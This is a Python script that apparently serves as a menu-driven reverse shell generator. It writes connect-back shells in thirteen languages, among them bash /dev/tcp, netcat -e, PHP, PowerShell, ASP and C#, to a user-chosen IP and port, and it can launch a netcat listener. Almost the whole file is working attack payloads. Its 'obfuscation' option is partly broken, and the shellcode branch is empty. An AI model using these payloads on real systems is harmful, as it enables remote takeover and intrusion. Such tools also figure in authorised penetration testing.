# Author: Prince Barai
# Date: 2024-08-29
# Description: This script generates various types of reverse shell scripts based on user input.
# Version: 1.0.0

import os
import subprocess

def display_menu():
    print("\nWelcome to the Reverse Shell Generator")
    print("Select the type of reverse shell you want to generate:")
    print("1. Bash")
    print("2. Python")
    print("3. PHP")
    print("4. Perl")
    print("5. PowerShell")
    print("6. Ruby")
    print("7. JavaScript (Node.js)")
    print("8. Java")
    print("9. Lua")
    print("10. Netcat (nc)")
    print("11. Shellcode")
    print("12. ASP")
    print("13. C#")
    choice = input("Enter the number of your choice: ")
    return choice

def ask_obfuscation():
    obfuscation = input("Do you want to add obfuscation? (yes/no): ").strip().lower()
    return obfuscation == "yes"

def get_ip_port():
    ip = input("Enter the IP address (default: 127.0.0.1): ").strip() or "127.0.0.1"
    port = input("Enter the port (default: 4444): ").strip() or "4444"
    return ip, port

def generate_reverse_shell(choice, ip, port, obfuscate):
    if choice == "1":
        name = "Bash Reverse Shell"
        script = f"""#!/bin/bash
{'#' * 10} {name} {'#' * 10}
{('echo -e ' + "'bash -i >& /dev/tcp/{}/*/1 0>&1'".format(ip, port) if obfuscate else 'bash -i >& /dev/tcp/{}/{} 0>&1').strip()}
"""
        extension = "sh"
    
    elif choice == "2":
        name = "Python Reverse Shell"
        script = f"""import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{ip}", {port}))
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

reverse_shell()
"""
        extension = "py"
    
    elif choice == "3":
        name = "PHP Reverse Shell"
        script = f"""<?php
{'#' * 10} {name} {'#' * 10}
$fp = fsockopen("{ip}", {port});
while (!feof($fp)) {{
    $cmd = fgets($fp);
    if ($cmd) {{
        $output = shell_exec($cmd);
        fwrite($fp, $output);
    }}
}}
fclose($fp);
?>
"""
        extension = "php"
    
    elif choice == "4":
        name = "Perl Reverse Shell"
        script = f"""#!/usr/bin/perl
use IO::Socket::INET;

$socket = new IO::Socket::INET(
    PeerAddr => '{ip}',
    PeerPort => {port},
    Proto    => 'tcp',
);
open(STDIN, "<&", $socket);
open(STDOUT, ">&", $socket);
open(STDERR, ">&", $socket);
exec("/bin/sh -i");
"""
        extension = "pl"
    
    elif choice == "5":
        name = "PowerShell Reverse Shell"
        if obfuscate:
            script = f"""$client = New-Object System.Net.Sockets.TcpClient("{ip}", {port})
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$buffer = New-Object System.Byte[] 1024
while ($true) {{
    $data = $reader.ReadLine()
    if ($data -eq "exit") {{ break }}
    $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c $data" -NoNewWindow -RedirectStandardOutput "$stream" -RedirectStandardError "$stream" -PassThru
    $writer.WriteLine($process.StandardOutput.ReadToEnd())
    $writer.WriteLine($process.StandardError.ReadToEnd())
}}
$client.Close()
"""
        else:
            script = f"""$client = New-Object System.Net.Sockets.TcpClient("{ip}", {port})
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$buffer = New-Object System.Byte[] 1024
while ($true) {{
    $data = $reader.ReadLine()
    if ($data -eq "exit") {{ break }}
    $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c $data" -NoNewWindow -RedirectStandardOutput "$stream" -RedirectStandardError "$stream" -PassThru
    $writer.WriteLine($process.StandardOutput.ReadToEnd())
    $writer.WriteLine($process.StandardError.ReadToEnd())
}}
$client.Close()
"""
        extension = "ps1"
    
    elif choice == "6":
        name = "Ruby Reverse Shell"
        script = f"""require 'socket'
require 'open3'

socket = TCPSocket.new('{ip}', {port})
while command = socket.gets
  Open3.popen3(command.chomp) do |stdin, stdout, stderr, wait_thr|
    socket.puts stdout.read
    socket.puts stderr.read
  end
end
socket.close
"""
        extension = "rb"
    
    elif choice == "7":
        name = "JavaScript (Node.js) Reverse Shell"
        if obfuscate:
            script = f"""const net = require('net');
const cp = require('child_process');
const sh = cp.spawn('/bin/sh', []);

const client = new net.Socket();
client.connect({port}, '{ip}', () => {{
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}});
"""
        else:
            script = f"""const net = require('net');
const cp = require('child_process');

const client = new net.Socket();
client.connect({port}, '{ip}', () => {{
  client.pipe(require('child_process').spawn('/bin/sh').stdin);
}});
"""
        extension = "js"
    
    elif choice == "8":
        name = "Java Reverse Shell"
        script = f"""import java.io.*;
import java.net.*;

public class ReverseShell {{
    public static void main(String[] args) throws Exception {{
        Socket socket = new Socket("{ip}", {port});
        InputStream input = socket.getInputStream();
        OutputStream output = socket.getOutputStream();
        Process process = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
        InputStream processInput = process.getInputStream();
        OutputStream processOutput = process.getOutputStream();

        byte[] buffer = new byte[1024];
        int bytesRead;
        while ((bytesRead = input.read(buffer)) != -1) {{
            processOutput.write(buffer, 0, bytesRead);
            processOutput.flush();
            while ((bytesRead = processInput.read(buffer)) != -1) {{
                output.write(buffer, 0, bytesRead);
                output.flush();
            }}
        }}
        socket.close();
    }}
}}
"""
        extension = "java"
    
    elif choice == "9":
        name = "Lua Reverse Shell"
        script = f"""local s=assert(socket.tcp())
s:connect("{ip}", {port})
while true do
  local cmd = s:receive('*l')
  if cmd then
    local handle = io.popen(cmd)
    local result = handle:read('*a')
    s:send(result)
  end
end
s:close()
"""
        extension = "lua"
    
    elif choice == "10":
        name = "Netcat (nc) Reverse Shell"
        script = f"""nc {ip} {port} -e /bin/sh
"""
        extension = "sh"
    
    elif choice == "11":
        name = "Shellcode"
        script = f"""# Shellcode for a reverse shell (example in hex format, needs to be used with appropriate tools)
# Example shellcode, use with caution and adjust for the platform
"""
        extension = "bin"
    
    elif choice == "12":
        name = "ASP Reverse Shell"
        script = f"""<%
Set objSocket = CreateObject("MSWinsock.Winsock")
objSocket.RemoteHost = "{ip}"
objSocket.RemotePort = {port}
objSocket.Connect
Do Until objSocket.Connected
    WScript.Sleep 100
Loop
Set objShell = CreateObject("WScript.Shell")
Do
    strCmd = objSocket.ReceiveData
    If Len(strCmd) > 0 Then
        Set objExec = objShell.Exec(strCmd)
        objSocket.SendData objExec.StdOut.ReadAll
    End If
Loop
%>
"""
        extension = "asp"
    
    elif choice == "13":
        name = "C# Reverse Shell"
        script = f"""using System;
using System.IO;
using System.Net.Sockets;

class Program {{
    static void Main(string[] args) {{
        TcpClient client = new TcpClient("{ip}", {port});
        NetworkStream stream = client.GetStream();
        StreamWriter writer = new StreamWriter(stream);
        StreamReader reader = new StreamReader(stream);

        while (true) {{
            string command = reader.ReadLine();
            if (command == null) break;
            var process = new System.Diagnostics.Process {{
                StartInfo = new System.Diagnostics.ProcessStartInfo {{
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }}
            }};
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            writer.WriteLine(output + error);
            writer.Flush();
        }}
        client.Close();
    }}
}}
"""
        extension = "cs"
    
    else:
        return "Invalid choice.", None, None

    return name, script, extension

def start_netcat_listener(ip, port):
    print("Starting Netcat listener...")
    try:
        # Start a Netcat listener
        subprocess.run(["nc", "-lvp", port], check=True)
    except KeyboardInterrupt:
        print("Netcat listener stopped.")

def main():
    os.system('clear')  # For Linux/MacOS
    # os.system('cls')  # For Windows
    
    choice = display_menu()
    obfuscate = ask_obfuscation()
    ip, port = get_ip_port()
    
    name, shell_script, extension = generate_reverse_shell(choice, ip, port, obfuscate)
    
    if shell_script:
        filename = f"reverse_shell_{name.replace(' ', '_').lower()}.{extension}"
        with open(filename, 'w') as file:
            file.write(shell_script)
        
        print(f"Generated reverse shell script saved as '{filename}'")
        
        if choice == "10":  # Netcat (nc) reverse shell selected
            start_listener = input("Do you want to start the Netcat listener now? (yes/no): ").strip().lower()
            if start_listener == "yes":
                start_netcat_listener(ip, port)
    else:
        print(name)  # Print error message if invalid choice

if __name__ == "__main__":
    main()

